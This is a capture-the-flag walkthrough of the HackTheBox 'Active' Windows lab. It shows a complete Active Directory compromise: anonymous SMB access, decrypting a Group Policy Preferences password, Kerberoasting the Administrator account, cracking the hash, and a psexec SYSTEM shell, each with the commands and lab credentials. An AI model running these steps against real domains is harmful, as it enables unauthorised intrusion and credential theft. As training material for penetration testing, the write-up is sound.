---
title: HackTheBox - Active
date: 2021-09-08 15:55:12 +0100
categories: [Hackthebox walkthroughs, Windows, Easy]
tags: [Active Directory, rpcclient, ldapsearch, SMB, smbclient, Groups.xml, GPP, Group Policy Preferences, gpp-decrypt, kerbrute, Kerberos, Kerberoasting, impacket, GetUserSPNs.py, psexec.py, htb-windows-easy, writeup, oscp-prep]
image: /assets/img/htb/machines/windows/easy/active/Active2.png
---

## Enumeration

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Active-full-port-scan.txt 10.10.10.100
Warning: 10.10.10.100 giving up on port because retransmission cap hit (1).
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.100s latency).
Not shown: 63856 closed ports, 1656 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-08 12:05:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m22s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-08T12:06:21
|_  start_date: 2021-09-08T11:22:59
```

### RPC (port 135)

```console
root@kali:~/htb/machines/Windows/Active# rpcclient -U '%' 10.10.10.100
rpcclient $> srvinfo
        10.10.10.100   Wk Sv PDC Tim NT     Domain Controller
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b
rpcclient $> enumdomusers
Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> getdompwinfo
Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $>
```

### LDAP (port 389)

```bash
$ ldapsearch -h 10.10.10.100 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=active,DC=htb
namingContexts: CN=Configuration,DC=active,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
namingContexts: DC=DomainDnsZones,DC=active,DC=htb
namingContexts: DC=ForestDnsZones,DC=active,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
$ echo "$TARGET  active.htb" >> /etc/hosts
```

### SMB (Port 445)

```bash
$ smbclient -L //$TARGET/ -U '%'

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```

The only shared folder which we access to is **Replication**. 

> **Note**: We could have mounted it with the following command: `mount -t cifs /10.10.10.100/Replication /mnt/Replication -o username=<username>,password=<password>,domain=active.htb` 

After inspecting the whole content, we can find a `Groups.xml` file.

**Group Policy Preferences** (GPP) was introduced in Windows Server 2008. Among many other features, it allowed administrators to modify users and groups across their network.

The defined password was **AES-256** encrypted and stored in this `Groups.xml` file.

```
$ smbclient //$TARGET/Replication/ -U '%'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018

                10459647 blocks of size 4096. 5728641 blocks available
...
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018

                10459647 blocks of size 4096. 5728499 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.6 KiloBytes/sec) (average 2.3 KiloBytes/sec)
```

This file indicates that a user called `SVC_TGS` exists and we have also its encrypted password (`cpassword`).

```bash
$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

In 2012, Microsoft published the [AES key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2), meaning that passwords set using GPP are now trivial to crack 
and considered <u>low hanging fruits</u>.

We can decrypt this password using `gpp-decrypt`:

```bash
$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

`SVC_TGS`'s password is `GPPstillStandingStrong2k18`.

We can use it to access more SMB shared folders:

![](/assets/img/htb/machines/windows/easy/active/user.png)

### Kerberos (port 88)

First, we can confirm that this user exists on the domain:

```bash
$ ./kerbrute userenum --dc active.htb -d active.htb User.txt
```

![](/assets/img/htb/machines/windows/easy/active/kerbrute.png)

## Foothold

### Kerberoasting

According to [MITRE ATT&CK - Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/):

> "Service principal names (**SPNs**) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service)."

An attacker may abuse a valid Kerberos ticket-granting ticket (TGT) _(or sniff network traffic)_ to obtain a ticket-granting service (TGS) ticket.

The **Kerberoasting** attack consists in extracting a hash of the encrypted material from a Kerberos Ticket Granting Service reply (TGS_REP). 

This hash is the password hash of the account in whose context the service instance is running. 

Obviously, it can be subjected to offline cracking in order to retrieve the plaintext password of the account.

Now that we assume that we know `SVC_TGS`'s password we can perform a **Kerberoasting** attack using **impacket**'s script `GetUserSPNs.py`.


```bash
$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip $TARGET -request
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2021-01-21 17:07:03.723783             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$16a24811f8ba1df0a56c39fa8da458ce$f1b56d38da31eaaabcab52f3a8b736407fc9ccff5afb1299c04d4e75dc97fe04359b3dfa74b1c368c6ce60be284a53e0e0ca9c87bf80dde35a5052224ca4946efe8bab33b627276782b9cde15d3d192b4822b73ae18948236bac0eb15e710ba95e9f320994854e4a14c38fb6cec4bd2186a1d309b42cb1cc6fe0cd3bff4eecccb53de5b1fba8e2acd6bf6d81076a5804cb7fc6dedab21cc5981facd73fd7411c2823a6a953cae330d6c3349f3322fda528cb3d1c66f263ba8883e68bab1f9cac60a015956f86bc8fa25a3c1541b844fd2799d90f1c391824770856ebdd578cad7884486fbc1a783c3718f95ab3504fbee6036a710666c565e5227ebcb68775e524ca9547f7c4056a91a83b017f25464a8e14f75acac4ed7ce380883c35ab864ece280b627c0326a0b8b715e518fe608ede5340fb5abcbe9b41fb5e050006fcb2b07caa5c99b22847d59e77873f7773c2df0243160acdc6629843b57a3e89c49a5343e94d4803f02d960a78bc08a67d0e3c044ad9c959a669a96c630d9e3109a1ab7ac16579bf5dd9614ab22f7edabdc89d6c6982cc13b4b4f2efb071f372278785213084c5b6fa4a5699b85c25a16500707ec2d3ddb32cb68372f609a9c3b41160122991bec40bcbbdc7da5faabc2b0973c521f9b230d5f88aee9dfe4008dbc7954a47828a79c84e6c3b13cd827206fcbcc00233f71d0225f113c2efd5ebbaf004b25e86948e991c56f0253c2427f712ef9b25691ac1ac5c66479f83d8ad1a0584c84bd0202ecb026837c227d05662fe38c697d6253c5ac76b7dea7fdbd01181a6f9648245d473f1b6597b065243f74ab86b03033e5fe9fc8b75446a5118ffcbc6e597540fdd3902076f6ef19d9726be148891cc680de89ad62cb7c153b03ef0df36ce6325efa26e4ead466cbb0063c19f043a67775ff84b97034ce31ff6e1b95e1657814408282bb8df928dee271d374f35e02c33fbabf6d5cae02e1c25985987779fb1b06fde64d2ebaa0425c1ac974672b28b1bc93a85d0430aefb070208f864cae8ddb411720f841d8620fdc532389205ce29de641c129cec0dabab923e63c050aefebc01dcbe9cf32e66640bce471b0155e626f78774eb75ae4bfc3b87c129dfaba3084d10522ae51c97e698a1fabb982d9cf54b112594a0836ceaf704d8a2f24ad24923bc159666b9d2464001a3ec08969ea34de414c54c32af9e53627d6483e20a8db197db764c83d24ba78d291e8063a44dc0c7ba3d1
```

Yes! We dumped the `Administrator`'s password hash. We can try to crack it using `hashcat` or `john`:

```bash
$ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
...
Ticketmaster1968
...
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
...
Ticketmaster1968
...
```

### Gaining access

**Impacket**'s `psexec.py` can be used to get a shell as Administrator, and gain `root.txt`:

```bash
$ psexec.py active.htb/Administrator:Ticketmaster1968@$TARGET
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file JyqnDLAw.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service MQiP on 10.10.10.100.....
[*] Starting service MQiP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

___

## Useful links

- [Using Group Policy Preferences for Password Management = Bad Idea](https://adsecurity.org/?p=384)
- [MSDN - AES key](http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx#endNote2)
- [Detecting Kerberoasting Activity ](https://adsecurity.org/?p=3458)